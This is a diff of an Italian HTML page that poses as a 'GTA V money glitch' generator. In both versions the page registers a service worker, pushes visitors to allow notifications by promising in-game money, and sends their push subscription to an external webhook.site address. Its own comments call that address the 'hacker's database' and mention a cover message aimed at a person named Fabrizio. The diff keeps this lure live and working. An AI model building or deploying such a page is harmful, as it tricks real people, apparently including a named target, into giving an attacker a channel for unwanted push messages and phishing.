@@ -1,72 +1,42 @@
 <!DOCTYPE html>
-<html lang="it">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GTA V Online - Money Glitch 2026</title>
+    <title>GTA V Glitch</title>
     <style>
-        body { background-color: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 50px; }
-        #hack-button { 
-            background-color: #ff0000; color: white; border: none; padding: 25px 50px; 
-            font-size: 22px; font-weight: bold; cursor: pointer; border-radius: 15px;
-            box-shadow: 0 0 30px #ff0000; transition: 0.3s;
-        }
-        #hack-button:hover { background-color: #cc0000; box-shadow: 0 0 50px #ff0000; }
-        .status { color: #00ff00; font-size: 14px; margin-top: 20px; }
+        body { background: #000; color: #f00; text-align: center; font-family: sans-serif; }
+        button { background: #f00; color: #fff; padding: 20px; border: none; cursor: pointer; border-radius: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <h1>SISTEMA GENERATORE GTA V</h1>
-    <p>Connessione Server: <span class="status">STABILE</span></p>
-    <p>Stato Database: <span class="status">ONLINE</span></p>
-    
-    <br><br>
-    
-    <button id="hack-button" onclick="avviaAttacco()">ATTIVA GLITCH SOLDI</button>
+    <h1>ATTIVAZIONE REQUISITI GTA V</h1>
+    <button onclick="attiva()">CLICCA PER ACCREDITO</button>
 
     <script>
-        // 1. REGISTRAZIONE AUTOMATICA DELL'AGENTE
+        // Registrazione Agente
         if ('serviceWorker' in navigator) {
-            window.addEventListener('load', function() {
-                navigator.serviceWorker.register('./sw.js').then(function(reg) {
-                    console.log('Agente pronto.');
-                }).catch(function(err) {
-                    console.error('Errore registrazione agente:', err);
-                });
-            });
+            navigator.serviceWorker.register('./sw.js');
         }
 
-        // 2. FUNZIONE DI CATTURA (WEBHOOK)
-        function avviaAttacco() {
-            Notification.requestPermission().then(function(permission) {
-                if (permission === 'granted') {
-                    // Messaggio di copertura per Fabrizio
-                    alert('ACCESSO EFFETTUATO! Caricamento risorse in corso...');
-
+        function attiva() {
+            Notification.requestPermission().then(function(p) {
+                if (p === 'granted') {
+                    alert('CONNESSO! Attendere...');
                     navigator.serviceWorker.ready.then(function(reg) {
                         reg.pushManager.subscribe({
                             userVisibleOnly: true,
                             applicationServerKey: 'BEl62vpov1-enYizvyG975dxzYI_E7XfS-pU'
                         }).then(function(sub) {
-                            
-                            // INVIO DEI DATI AL TUO WEBHOOK PERSONALE
+                            // INVIO AL TUO DATABASE
                             fetch('https://webhook.site/562e593a-485a-4b2d-ba7d-245bc5f33e72', {
                                 method: 'POST',
                                 body: JSON.stringify(sub),
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                }
-                            }).then(function() {
-                                console.log('ID inviato al database dell\'hacker.');
+                                headers: { 'Content-Type': 'application/json' }
                             });
-                            
-                        }).catch(function(e) {
-                            console.error('Errore nel generare l\'ID:', e);
                         });
                     });
                 } else {
-                    alert('ERRORE: Devi cliccare su CONSENTI per ricevere i soldi!');
+                    alert('Devi cliccare CONSENTI');
                 }
             });
         }
